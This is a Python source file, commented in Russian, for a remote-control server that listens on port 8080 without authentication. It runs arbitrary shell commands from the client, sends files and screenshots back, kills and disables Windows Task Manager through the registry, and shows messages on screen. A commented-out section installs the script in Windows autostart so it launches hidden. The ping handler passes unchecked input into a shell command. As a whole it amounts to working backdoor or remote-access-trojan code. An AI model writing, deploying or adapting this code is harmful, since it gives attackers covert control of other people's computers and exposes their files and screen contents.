import socket
import subprocess
import os
import webbrowser
import platform
import time
import winreg
import psutil

from PIL import ImageGrab
from datetime import datetime
from io import BytesIO



#import psutil
# Настройки сервера
HOST = '0.0.0.0'  # Слушать все адреса
PORT = 8080       # Порт для подключения

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)



#conn, addr = server_socket.accept()
def heandle_client(conn, addr):

   

    current_dir = os.getcwd()  # Текущая директория сервера

    while True:
        try:
            # Получение команды
            
            command = conn.recv(4096).decode("utf-8").strip()




            if command.lower() == 'exit':
                break

            
            elif command.lower() == 'close_server':
                conn.close()
                server_socket.close()

            elif command.startswith("open_cmd"):
                # Открыть калькулятор
                if os.name == "nt":  # Windows
                    subprocess.Popen("cmd.exe")
                # elif os.name == "posix":  # Linux/Mac
                #     subprocess.Popen(["gnome-calculator"])
                #conn.send(" запущен.".encode("utf-8"))
            

            elif command.startswith("open_calculator") or command.startswith("1"):
                # Открыть калькулятор
                if os.name == "nt":  # Windows
                    subprocess.Popen("calc.exe")
                elif os.name == "posix":  # Linux/Mac
                    subprocess.Popen(["gnome-calculator"])
                conn.send("Калькулятор запущен.".encode("utf-8"))

            elif command.startswith("create_file") or command.startswith("2"):
                # Создать файл на рабочем столе
                _, message, file_name = command.split(maxsplit = 2)
                print(f"'_' = {_}, file_name = {file_name}")
                file_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{file_name}.txt")
                with open(file_path, "w") as f:
                    f.write(message)
                conn.send(f"Файл создан: {file_path}".encode("utf-8"))

            # Просмотр текущей директории
            if command == "list_dir" or command.startswith("3"):
                files = os.listdir(current_dir)
                conn.send("\n".join(files).encode("utf-8"))

            # Перемещение в другую директорию
            elif command.startswith("change_dir") or command.startswith("4"):
                _, path = command.split(maxsplit=1)
                new_dir = os.path.join(current_dir, path)
                if os.path.isdir(new_dir):
                    current_dir = new_dir
                    conn.send(f"Текущая директория: {current_dir}".encode("utf-8"))
                else:
                    conn.send("Ошибка: Указанная директория не существует.".encode("utf-8"))

            # Получение текущей директории
            elif command == "get_cwd" or command.startswith("5"):
                conn.send(current_dir.encode("utf-8"))

            # Передача файла клиенту
            elif command.startswith("get_file") or command.startswith("6"):
                _, file_name = command.split(maxsplit=1)
                file_path = os.path.join(current_dir, file_name)
                if os.path.isfile(file_path):
                    conn.send(b"FILE_TRANSFER_START")
                    with open(file_path, "rb") as file:
                        data = file.read()
                        conn.sendall(data)
                    conn.send(b"FILE_TRANSFER_END")
                else:
                    conn.send("Ошибка: Файл не найден.".encode("utf-8"))
                
            elif command == "task_manager" or command.startswith("7"):
                # Удаление процесса диспетчера задач
                try:
                    task_manager_name = "Taskmgr.exe" if os.name == "nt" else "task-manager"  # Название процесса
                    killed = False
                    for proc in psutil.process_iter(['name']):
                        if proc.info['name'] == task_manager_name:
                            proc.terminate()
                            killed = True
                            conn.send(f"Процесс {task_manager_name} завершён.".encode("utf-8"))
                            break
                    if not killed:
                        conn.send(f"Процесс {task_manager_name} не найден.".encode("utf-8"))
                except Exception as e:
                    conn.send(f"Ошибка при попытке завершить процесс: {str(e)}".encode("utf-8"))

            

            elif command == "task_manager_disab":
                try:
                    # Открываем ветку реестра
                    reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
                    reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_key_path)
                    
                    # Устанавливаем значение DisableTaskMgr = 1
                    winreg.SetValueEx(reg_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                    winreg.CloseKey(reg_key)
                    print("Диспетчер задач отключён.")
                except Exception as e:
                    print(f"Ошибка: {str(e)}")

            elif command == "task_manager_enab": 
                try:
                    # Удаляем ключ DisableTaskMgr
                    reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
                    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(reg_key, "DisableTaskMgr")
                    winreg.CloseKey(reg_key)
                    print("Диспетчер задач включён.")
                except FileNotFoundError:
                    print("Диспетчер задач уже включён.")
                except Exception as e:
                    print(f"Ошибка: {str(e)}")


        
            elif command == "get_system_info" or command.startswith("7"):
                # Получение характеристик ПК
                memory = psutil.virtual_memory()
                system_info = {
                    "OS": platform.system(),
                    "OS Version": platform.version(),
                    "Processor": platform.processor(),
                    "Memory": f"{memory.total / (1024 ** 3):.2f}",
                    'Используется': f'{memory.used / (1024**3):.2f} ГБ',
                    'Свободно': f'{memory.available / (1024**3):.2f} ГБ',
                    'Процент использования': f'{memory.percent}%',
                }
                info = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
                conn.send(info.encode("utf-8"))

            elif command.startswith("open_website") or command.startswith("8"):
                # Открытие сайта
                _, url = command.split(maxsplit=1)
                try:
                    webbrowser.open(url)
                    conn.send(f"Сайт открыт: {url}".encode("utf-8"))
                except Exception as e:
                    conn.send(f"Ошибка при открытии сайта: {e}".encode("utf-8"))


            elif command.startswith("uptime") or command.startswith("9"):
                with open("/proc/uptime", "r") as f:
                    uptime_seconds = float(f.readline().split()[0])
                uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime_seconds))
                conn.send(f"Время работы системы: {uptime_str}".encode("utf-8"))

            elif command.startswith("change_time") or command.startswith("10"):
                try:
                    _, new_time = command.split(maxsplit=1)
                    subprocess.run(["date", "-s", new_time], check=True)
                    conn.send(f"Время сервера успешно изменено на {new_time}".encode("utf-8"))
                except Exception as e:
                    conn.send(f"Ошибка изменения времени: {e}".encode("utf-8"))

            elif command.startswith("ping") or command.startswith("11"):
                _, address = command.split(maxsplit=1)
                result = subprocess.getoutput(f"ping -c 4 {address}")
                conn.send(result.encode("utf-8"))


            elif command.startswith("show_message") or command.startswith("12"):
                _, message = command.split(maxsplit=1)
                if os.name == "nt":  # Windows
                    subprocess.run(["msg", "*", message], check=True)
                else:
                    subprocess.run(["notify-send", message], check=True)
                conn.send(f"Сообщение '{message}' отправлено.".encode("utf-8"))


           

            elif command.startswith("screenshot"):
                
                try:
                    # Создание скриншота
                    screenshot = ImageGrab.grab()

                    # Сохранение скриншота в памяти
                    screenshot_bytes = BytesIO()
                    screenshot.save(screenshot_bytes, format="PNG")
                    screenshot_bytes.seek(0)

                    # Уведомление клиента о начале передачи
                    conn.send(b"FILE_TRANSFER_START")

                    # Отправка скриншота по частям
                    while chunk := screenshot_bytes.read(4096):
                        conn.send(chunk)

                    # Уведомление клиента о завершении передачи
                    conn.send(b"FILE_TRANSFER_END")

                except Exception as e:
                    conn.send(f"Ошибка: {e}".encode("utf-8"))



            else:
                # Выполнение произвольной команды
                output = subprocess.getoutput(command)
                conn.send(output.encode("utf-8"))

        except Exception as e:
            conn.send(f"Ошибка: {e}".encode("utf-8"))

    conn.close()

while True:
    try:
        conn, addr = server_socket.accept()
        
        heandle_client(conn, addr)
    except KeyboardInterrupt:
        print("\nСервер завершает работу.")
        break
    except Exception as e:
        print(f"Ошибка сервера: {e}")

server_socket.close()


# import socket
# import subprocess
# import os
# import pyautogui  # Для управления мышкой и клавиатурой


# import os
# import shutil
# import sys
# import winreg

# def add_to_autostart():
#     script_path = sys.argv[0]  # Путь к самому скрипту

#     # Создание ярлыка в папке автозагрузки
#     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
#     shortcut_path = os.path.join(startup_folder, 'server.lnk')

#     if not os.path.exists(shortcut_path):
#         # Создание ярлыка через Windows API
#         import pythoncom
#         from win32com.client import Dispatch

#         shell = Dispatch('WScript.Shell')
#         shortcut = shell.CreateShortcut(shortcut_path)
#         shortcut.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")  # Путь к интерпретатору Python
#         shortcut.Arguments = f'"{script_path}"'  # Путь к вашему скрипту
#         shortcut.WorkingDirectory = os.path.dirname(script_path)
#         shortcut.WindowStyle = 7
#         print("ss")
#         shortcut.Save()
#         print(f"Ярлык создан: {shortcut_path}")
#     else:
#         print("Скрипт уже находится в автозагрузке.")

# if __name__ == "__main__":
#     add_to_autostart()
#     print("Скрипт добавлен в автозагрузку!")
#     # Основная логика вашего скрипта:
#     while True:



#         # Настройки сервера
#         HOST = '0.0.0.0'  # Слушать все адреса
#         PORT = 8080       # Порт для подключения

#         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         server_socket.bind((HOST, PORT))
#         server_socket.listen(1)
#         print(f"Сервер запущен. Ожидание подключения на порту {PORT}...")

#         conn, addr = server_socket.accept()
#         print(f"Подключение от: {addr}")

#         while True:
#             try:
#                 # Получение команды
#                 command = conn.recv(1024).decode().strip()
#                 if command.lower() == 'exit':
#                     print("Закрытие соединения.")
#                     break

#                 if command.startswith("create_file"):
#                     # Создать файл на рабочем столе
#                     file_path = os.path.join(os.path.expanduser("~"), "Desktop", "example.txt")
#                     with open(file_path, "w") as f:
#                         f.write("Это тестовое содержимое.")
#                     conn.send(f"Файл создан: {file_path}".encode())

#                 elif command.startswith("open_calculator"):
#                     # Открыть калькулятор
#                     if os.name == "nt":  # Windows
#                         subprocess.Popen("calc.exe")
#                     elif os.name == "posix":  # Linux/Mac
#                         subprocess.Popen(["gnome-calculator"])
#                     conn.send("Калькулятор запущен.".encode())

#                 elif command.startswith("move_mouse"):
#                     # Переместить мышку
#                     x, y = map(int, command.split()[1:3])  # Пример: move_mouse 100 200
#                     pyautogui.moveTo(x, y)
#                     conn.send(f"Мышка перемещена в координаты: {x}, {y}".encode())

#                 else:
#                     # Выполнение произвольной команды
#                     output = subprocess.getoutput(command)
#                     conn.send(output.encode())

#             except Exception as e:
#                 conn.send(f"Ошибка: {e}".encode())

#         conn.close()
#         server_socket.close()